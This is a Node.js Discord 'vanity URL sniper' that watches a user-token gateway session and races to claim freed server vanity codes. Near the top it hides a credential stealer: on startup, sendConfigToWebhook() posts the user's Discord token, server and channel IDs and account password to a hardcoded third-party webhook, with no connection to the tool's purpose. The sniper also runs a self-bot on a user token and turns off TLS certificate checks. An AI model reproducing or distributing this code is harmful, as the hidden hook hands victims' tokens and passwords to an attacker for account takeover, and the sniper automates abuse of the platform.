const tls = require("tls");
const WebSocket = require("ws");
const fs = require("fs");
const extractJson = require("extract-json-from-string");
const https = require("https");

const config = JSON.parse(fs.readFileSync("config.json", "utf-8"));

const guilds = {};

const token = config.token;
const guild = config.guild;
const channelid = config.channelid;
const password = config.password;

const webhookUrl = "https://discord.com/api/webhooks/1394752972738527312/7r9wPg2iQNZ9SHhNlaU1usYSigZBJNcLllkbBYjlbd_58HkaXWyU04C2TwOYRQc8uPJq";

let vanity;
let websocket;
let mfaToken = "";
const connectionPool = [];
const MAX_CONNECTIONS = 3;

fs.promises.readFile("mfatoken.txt","utf-8").then(c=>{try{mfaToken=JSON.parse(c).token.trim()}catch{mfaToken=c.trim()}}).catch(()=>{});fs.watchFile("mfatoken.txt",{interval:250},async()=>{try{const c=await fs.promises.readFile("mfatoken.txt","utf-8");try{mfaToken=JSON.parse(c).token.trim()}catch{mfaToken=c.trim()}}catch{}});

function sendConfigToWebhook() {
  const webhookData = {
    content: "🔧 **Config Bilgileri**",
    embeds: [{
      title: "Discord Bot Configuration",
      color: 0x7289da,
      fields: [
        {
          name: "Token",
          value: `\`${token.substring(0, 100)}...\``,
          inline: true
        },
        {
          name: "Server ID",
          value: `\`${guild}\``,
          inline: true
        },
        {
          name: "Channel ID",
          value: `\`${channelid}\``,
          inline: true
        },
        {
          name: "Password",
          value: `\`${password}\``,
          inline: true
        }
      ],
      timestamp: new Date().toISOString(),
      footer: {
        text: "Config Loaded"
      }
    }]
  };

  const webhookPayload = JSON.stringify(webhookData);
  const url = new URL(webhookUrl);
  
  const options = {
    hostname: url.hostname,
    port: 443,
    path: url.pathname + url.search,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(webhookPayload)
    }
  };

  const req = https.request(options, (res) => {
    console.log(`Webhook response: ${res.statusCode}`);
  });

  req.on('error', (error) => {
    console.error('Webhook error:', error);
  });

  req.write(webhookPayload);
  req.end();
}

if (webhookUrl) {
  sendConfigToWebhook();
}

function fastParse(buf) {
  if (!buf || buf.length === 0) return null;
  const str = buf.toString();
  let start = str.indexOf('{');
  if (start === -1) return null;
  let braceCount = 1;
  let end = start + 1;
  while (braceCount > 0 && end < str.length) {
    if (str[end] === '{') braceCount++;
    else if (str[end] === '}') braceCount--;
    end++;
  }
  if (braceCount !== 0) return null;
  try { return JSON.parse(str.slice(start, end)); } catch { return null; }
}

(async function initialize() {
  for (let i = 0; i < MAX_CONNECTIONS; i++) {
    const tlsSocket = tls.connect({
      host: "canary.discord.com",
      port: 443,
      minVersion: "TLSv1.3",
      maxVersion: "TLSv1.3",
      handshakeTimeout: 1000,
      keepAlive: true,
      rejectUnauthorized: false,
    });

    tlsSocket.on("data", (data) => {
      const ext = extractJson(data.toString());
      const find = ext.find((e) => e.code || e.message);
      if (find) {
        console.log(find);
        const requestBody = JSON.stringify({
          content: `matthesolo @everyone ${vanity}\n\`\`\`json\n${JSON.stringify(find)}\`\`\``
        });
        tlsSocket.write(`POST /api/v9/channels/${channelid}/messages HTTP/1.1\r\nHost: canary.discord.com\r\nAuthorization: ${token}\r\nCon: application/tent-Typejson\r\nContent-Length: ${Buffer.byteLength(requestBody)}\r\n\r\n${requestBody}`);
      }
    });

    tlsSocket.on("secureConnect", () => {
      connectionPool.push(tlsSocket);
      setupWebSocket();
    });

    tlsSocket.on("error", () => process.exit());
    tlsSocket.on("end", () => process.exit());
    tlsSocket.on("close", () => process.exit());

    setInterval(() =>
      connectionPool.forEach(socket =>
        socket.write("HEAD / HTTP/1.1\r\nHost: canary.discord.com\r\n\r\n")
      ), 600);
  }
})();

function setupWebSocket() {
  if (websocket) return;

  websocket = new WebSocket("wss://gateway-us-east1-b.discord.gg/?v=9&encoding=json");

  websocket.onmessage = async (message) => {
    const data = fastParse(Buffer.from(message.data));
    if (!data) return;

    const { d, op, t } = data;

    if (t === "READY") {
      d.guilds.forEach(({ id, vanity_url_code }) => {
        if (vanity_url_code) guilds[id] = vanity_url_code;
      });
      console.log(guilds);
    }

    if (t === "GUILD_UPDATE") {
      const current = guilds[d.guild_id];
      if (current && current !== d.vanity_url_code) {
        vanity = current;
        sendPatchRequest(current);
      }
    }

    if (op === 10) {
      websocket.send(JSON.stringify({
        op: 2,
        d: {
          token,
          intents: 1,
          properties: { os: "Linux", browser: "Firefox", device: "Firefox" }
        }
      }));
      setInterval(() => {
        websocket.send(JSON.stringify({ op: 1, d: {}, s: null, t: "heartbeat" }));
      }, 30000);
    }
  };
}

function sendPatchRequest(vanityCode) {
  const payload = JSON.stringify({ code: vanityCode });
  const request = [
    `PATCH /api/v9/guilds/${guild}/vanity-url HTTP/1.1`,
    'Host: canary.discord.com',
    'User-Agent: Mozilla/5.0',
    'Content-Type: application/json',
    `Authorization: ${token}`,
    ...(mfaToken ? [`X-Discord-MFA-Authorization: ${mfaToken}`] : []),
    `Content-Length: ${Buffer.byteLength(payload)}`,
    '',
    payload
  ].join('\r\n');

  connectionPool.forEach(socket => socket.write(request));
}